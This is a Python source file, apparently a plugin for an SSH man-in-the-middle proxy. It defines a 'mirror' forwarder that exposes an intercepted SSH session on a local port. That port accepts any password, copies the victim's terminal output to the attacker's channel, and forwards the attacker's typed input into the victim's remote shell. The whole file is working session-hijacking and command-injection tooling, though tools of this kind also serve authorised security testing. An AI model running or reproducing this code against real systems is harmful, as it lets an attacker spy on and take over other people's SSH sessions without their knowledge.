import logging
import select
import threading
import socket
import time
import paramiko

from ssh_proxy_server.forwarders.ssh import SSHForwarder


class InjectServer(paramiko.ServerInterface):
    def __init__(self, server_channel):
        self.server_channel = server_channel
        self.injector_channel = None

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED

    def check_auth_password(self, username, key):
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return 'password'

    def check_channel_shell_request(self, channel):
        self.injector_channel = channel
        return True

    def check_channel_pty_request(self, channel, term, width, height,
                                  pixelwidth, pixelheight, modes):
        return True


class SSHMirrorForwarder(SSHForwarder):

    @classmethod
    def parser_arguments(cls):
        cls.PARSER.add_argument(
            '--ssh-injector-net',
            dest='ssh_injector_net',
            default='127.0.0.1',
            help='local address/interface where injector sessions are served'
        )
        cls.PARSER.add_argument(
            '--ssh-injector-key',
            dest='ssh_injector_key',
            required=True
        )

    def __init__(self, session):
        super().__init__(session)
        self.injector_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.injector_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.injector_sock.bind((self.args.ssh_injector_net, 0))
        self.injector_sock.listen(5)
        self.inject_server = None

        self.injector_client_sock = None

        self.conn_thread = threading.Thread(target=self.injector_connect)
        self.conn_thread.start()

    def injector_connect(self):
        logging.info("creating ssh injector shell %s, connect with telnet", self.injector_sock.getsockname())
        try:
            while self.session.running:
                readable = select.select([self.injector_sock], [], [])[0]
                if len(readable) == 1 and readable[0] is self.injector_sock:
                    self.injector_client_sock, addr = self.injector_sock.accept()

                    t = paramiko.Transport(self.injector_client_sock)
                    t.set_gss_host(socket.getfqdn(""))

                    t.load_server_moduli()
                    t.add_server_key(paramiko.RSAKey(filename=self.args.ssh_injector_key))
                    self.inject_server = InjectServer(self.server_channel)
                    event = threading.Event()
                    t.start_server(event=event, server=self.inject_server)
                    injector_channel = None
                    while not injector_channel:
                        injector_channel = t.accept(0.5)
                    event.wait()
                    while True:
                        if self.inject_server.injector_channel and self.inject_server.injector_channel.recv_ready():
                            buf = self.inject_server.injector_channel.recv(self.BUF_LEN)
                            self.server_channel.sendall(buf)
                        else:
                            time.sleep(0.1)

        except Exception:
            logging.exception("injector connection suffered an unexpected error")
            self.close_session(self.channel)

    def close_session(self, channel):
        super().close_session(channel)
        logging.info("closing injector connection %s", self.injector_sock.getsockname())
        self.injector_sock.close()
        self.conn_thread.join()

    def forward_stdout(self):
        if self.server_channel.recv_ready():
            buf = self.server_channel.recv(self.BUF_LEN)
            self.session.ssh_channel.sendall(buf)
            if self.inject_server is not None:
                self.inject_server.injector_channel.sendall(buf)

    def forward_stderr(self):
        if self.server_channel.recv_stderr_ready():
            buf = self.server_channel.recv_stderr(self.BUF_LEN)
            self.session.ssh_channel.sendall_stderr(buf)
            if self.inject_server is not None:
                self.inject_server.injector_channel.sendall(buf)
